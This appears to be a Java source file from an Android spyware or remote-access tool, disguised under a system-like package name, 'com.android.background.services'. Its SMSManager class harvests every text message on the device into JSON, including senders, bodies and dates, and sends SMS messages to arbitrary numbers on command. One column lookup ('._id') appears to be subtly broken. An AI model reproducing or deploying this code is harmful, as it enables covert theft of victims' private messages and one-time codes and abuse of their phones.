package com.android.background.services.helpers;

import android.annotation.SuppressLint;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;

import com.android.background.services.MainService;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
public class SMSManager {

    public static JSONObject getSMSList() {
        try {
            JSONObject SMSList = new JSONObject();
            JSONArray list = new JSONArray();

            Uri uriSMS = Uri.parse("content://sms");
            Cursor cur = MainService.getContextOfApplication()
                    .getContentResolver()
                    .query(uriSMS, null, null, null, "date DESC");

            if (cur != null && cur.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();

                    @SuppressLint("Range") String id = cur.getString(cur.getColumnIndex("._id"));
                    @SuppressLint("Range") String address = cur.getString(cur.getColumnIndex("address"));
                    @SuppressLint("Range") String body = cur.getString(cur.getColumnIndex("body"));
                    @SuppressLint("Range") long date = cur.getLong(cur.getColumnIndex("date"));
                    @SuppressLint("Range") int type = cur.getInt(cur.getColumnIndex("type"));
                    @SuppressLint("Range") int thread_id = cur.getInt(cur.getColumnIndex("thread_id"));
                    @SuppressLint("Range") int read = cur.getInt(cur.getColumnIndex("read"));
                    @SuppressLint("Range") int status = cur.getInt(cur.getColumnIndex("status"));

                    sms.put("id", id);
                    sms.put("phoneNo", address);
                    sms.put("msg", body);
                    sms.put("date", date);
                    sms.put("type", type);
                    sms.put("thread_id", thread_id);
                    sms.put("read", read);
                    sms.put("status", status);

                    list.put(sms);

                } while (cur.moveToNext());

                cur.close();
            }

            SMSList.put("smsList", list);
            Log.e("SMS", "Collected SMS list: " + list.length());
            return SMSList;

        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }


    public static boolean sendSMS(String phoneNo, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNo, null, msg, null, null);
            return true;
        } catch (Exception ex) {
            ex.printStackTrace();
            return false;
        }

    }


}
